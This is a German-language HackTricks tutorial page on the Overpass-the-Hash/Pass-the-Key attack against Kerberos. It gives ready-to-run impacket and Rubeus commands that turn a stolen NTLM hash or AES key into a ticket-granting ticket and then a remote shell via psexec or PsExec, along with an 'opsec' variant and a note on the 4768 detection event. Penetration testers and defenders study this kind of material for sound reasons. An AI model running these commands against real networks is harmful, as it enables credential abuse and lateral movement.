# Over Pass the Hash/Pass the Key

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und das [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

Der **Overpass The Hash/Pass The Key (PTK)**-Angriff ist für Umgebungen konzipiert, in denen das traditionelle NTLM-Protokoll eingeschränkt ist und die Kerberos-Authentifizierung Vorrang hat. Dieser Angriff nutzt den NTLM-Hash oder AES-Schlüssel eines Benutzers, um Kerberos-Tickets anzufordern und unbefugten Zugriff auf Ressourcen innerhalb eines Netzwerks zu ermöglichen.

Um diesen Angriff auszuführen, umfasst der erste Schritt das Erlangen des NTLM-Hashs oder des Passworts des Benutzerkontos. Nachdem diese Informationen gesichert wurden, kann ein Ticket Granting Ticket (TGT) für das Konto erhalten werden, was es dem Angreifer ermöglicht, auf Dienste oder Maschinen zuzugreifen, für die der Benutzer Berechtigungen hat.

Der Prozess kann mit den folgenden Befehlen initiiert werden:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Bei Szenarien, die AES256 erfordern, kann die Option `-aesKey [AES-Schlüssel]` verwendet werden. Darüber hinaus kann das erworbene Ticket mit verschiedenen Tools wie smbexec.py oder wmiexec.py verwendet werden, um den Angriffsbereich zu erweitern.

Aufgetretene Probleme wie _PyAsn1Error_ oder _KDC cannot find the name_ werden in der Regel durch Aktualisierung der Impacket-Bibliothek oder Verwendung des Hostnamens anstelle der IP-Adresse gelöst, um die Kompatibilität mit dem Kerberos KDC sicherzustellen.

Eine alternative Befehlssequenz unter Verwendung von Rubeus.exe zeigt eine weitere Facette dieser Technik:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Diese Methode spiegelt den **Pass-the-Key**-Ansatz wider, mit dem Schwerpunkt auf die Übernahme und direkte Nutzung des Tickets für Authentifizierungszwecke. Es ist wichtig zu beachten, dass die Initiierung einer TGT-Anforderung das Ereignis `4768: Ein Kerberos-Authentifizierungsticket (TGT) wurde angefordert` auslöst, was eine standardmäßige Verwendung von RC4-HMAC signalisiert, obwohl moderne Windows-Systeme AES256 bevorzugen.

Um den betrieblichen Sicherheitsstandards zu entsprechen und AES256 zu verwenden, kann der folgende Befehl angewendet werden:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referenzen

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs im [HackTricks-Repository](https://github.com/carlospolop/hacktricks) und im [HackTricks-Cloud-Repository](https://github.com/carlospolop/hacktricks-cloud)** einreichen.

</details>
